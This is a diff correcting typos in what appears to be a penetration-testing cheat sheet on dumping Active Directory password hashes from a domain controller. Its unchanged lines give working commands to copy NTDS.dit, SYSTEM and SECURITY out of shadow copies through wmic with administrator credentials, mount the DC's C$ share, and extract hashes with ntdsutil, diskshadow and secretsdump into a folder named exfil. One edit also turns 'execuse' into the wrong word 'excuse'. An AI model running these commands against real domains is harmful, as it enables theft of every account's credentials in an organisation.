@@ -144,7 +144,7 @@ Copy `NTDS.dit` `SYSTEM` and `SECRURITY` to `C:\temp`
 wmic /node:dc01 /user:administrator@domain /password:123456 process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\temp\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM c:\temp\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY c:\temp\"
 ```
 
-Mount the shadow copy locally to retrieve the fiels
+Mount the shadow copy locally to retrieve the files
 ```powershell
 net use j: \\dc01\c$\temp /user:administrator 123456; dir j:\
 ```
@@ -153,7 +153,7 @@ net use j: \\dc01\c$\temp /user:administrator 123456; dir j:\
 
 ### Dump NTDS.dit Hashes Using ntdsutil
 
-[!NOTE] This does not require credentials, but must at least have acess to the DC. [!NOTE]
+[!NOTE] This does not require credentials, but must at least have access to the DC. [!NOTE]
 
 ```powershell
 ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q
@@ -165,7 +165,7 @@ secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local
 ```
 
 ### Dump NTDS.dit Hashes Using diskshadow {.row-span-2}
-[!NOTE] This does not require credentials, but must at least have acess to the DC. [!NOTE]
+[!NOTE] This does not require credentials, but must at least have access to the DC. [!NOTE]
 
 On DCs Windows server version 2008+ we can use diskshadow to grab the ntdis.dit
 
@@ -179,7 +179,7 @@ create
 expose %someAlias% z:
 ```
 
-Then we execuse it
+Then we excuse it
 
 ```powershell
 mkdir c:\exfil
